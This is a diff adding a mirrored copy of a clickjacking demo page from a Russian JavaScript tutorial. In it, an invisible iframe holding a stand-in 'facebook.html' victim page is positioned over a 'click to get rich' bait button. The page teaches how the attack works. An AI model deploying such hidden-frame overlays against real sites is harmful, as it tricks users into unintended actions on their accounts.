@@ -1,0 +1,37 @@
+<!doctype html>
+<html>
+
+
+<!-- Mirrored from learn.javascript.ru/article/clickjacking/clickjacking/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Apr 2023 11:33:26 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+  <meta charset="UTF-8">
+</head>
+
+<body>
+
+  <style>
+    iframe {
+      width: 400px;
+      height: 100px;
+      position: absolute;
+      top: 5px;
+      left: -14px;
+      opacity: 0;
+      z-index: 1;
+    }
+  </style>
+
+  <div>Нажми, чтобы разбогатеть:</div>
+
+  <!-- Url с сайта жертвы -->
+  <iframe src="facebook.html"></iframe>
+
+  <button>Нажмите сюда!</button>
+
+  <div>...И ты крутой (вообще-то я крутой хакер)!</div>
+
+</body>
+
+<!-- Mirrored from learn.javascript.ru/article/clickjacking/clickjacking/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 01 Apr 2023 11:33:26 GMT -->
+</html>
